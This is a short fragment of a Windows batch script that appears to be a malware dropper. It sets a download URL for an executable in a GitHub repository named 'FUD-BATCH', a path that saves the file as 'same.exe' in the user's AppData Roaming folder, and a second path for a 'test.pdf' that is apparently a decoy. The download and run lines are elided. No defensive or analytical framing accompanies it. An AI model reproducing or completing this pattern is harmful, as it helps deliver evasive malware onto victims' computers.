...
set "url1=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/Save.exe"
set "output1=C:\Users\%USERNAME%\AppData\Roaming\same.exe" 
...
set "output2=C:\Users\%USERNAME%\AppData\Local\test.pdf"
